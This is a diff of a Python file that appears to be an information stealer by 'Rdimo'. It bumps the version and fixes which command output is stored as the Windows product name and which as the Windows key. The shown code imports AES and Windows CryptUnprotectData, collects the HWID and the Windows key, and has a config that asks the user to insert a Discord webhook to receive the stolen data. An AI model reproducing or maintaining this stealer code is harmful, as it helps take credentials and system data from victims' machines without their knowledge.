@@ -20,7 +20,7 @@ from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
 __author__ = "Rdimo"
-__version__ = '1.7.6'
+__version__ = '1.7.7'
 __license__ = "GPL-3.0"
 config = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
@@ -128,8 +128,8 @@ class Functions(object):
                 cmd_to_exec[i] = "N/A"
 
         HWID = cmd_to_exec[0].decode().split('\n')[1].strip()
-        productName = cmd_to_exec[1].decode().rstrip()
-        wkey = cmd_to_exec[2].decode().rstrip()
+        wkey = cmd_to_exec[1].decode().rstrip()
+        productName = cmd_to_exec[2].decode().rstrip()
         return [HWID, productName, wkey]
 
     @staticmethod
